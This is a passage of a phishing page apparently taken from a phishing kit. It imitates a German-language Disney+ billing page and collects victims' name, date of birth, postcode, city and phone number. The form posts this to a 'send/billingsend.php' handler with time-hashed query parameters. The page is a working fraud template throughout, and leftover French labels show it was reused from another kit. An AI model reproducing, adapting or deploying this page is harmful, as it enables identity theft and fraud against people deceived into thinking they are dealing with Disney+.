...
<head>
    ...
    <title>Rechnungsstellung | Disney+</title>
    ...
    <div id="webAppRoot" data-reactroot="">
                    ...
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form id="dssLogin" name="dssLogin" action="<?php echo './send/billingsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post">
                                <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;">SCHRITT 1 VON 2</div>
                                <br>
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Rechnungsinformationen</h3>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">name</legend>
                                    <span style="position: relative; display: block;">
                                        <input aria-label="Name" display="inline" id="surname" name="surname" maxlength="" placeholder="Name" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                ...
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    ...
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Vorname" display="inline" id="name" name="name" maxlength="" placeholder="Vorname" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
								...
								<fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="dob" name="dob" placeholder="Geburtsdatum (TT/MM/JJJJ)" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
										<script>
        ...
        date.addEventListener('input', function(e) {
            ...
            this.value = output.join('').substr(0, 14);
                                ...
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Postleitzahl</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="zipcode" display="inline"  id="zipcode" name="zipcode" maxlength="5" placeholder="Postleitzahl" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" type=”tel” onkeypress="return onlyNumberKey(event)" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
<script>
    function onlyNumberKey(evt) {
        ...
        return true;
                                ...
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="city" name="city" maxlength="" placeholder="Stadt" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">password</legend>
                                    <span style="position: relative; display: block;">
                                                <input aria-label="Adresse e-mail" display="inline" id="password" name="tel" maxlength="" placeholder="Telefonnummer" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required>
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit">WEITER</button></div>
                            </form>
                        </div>
                    </main>
                </div>
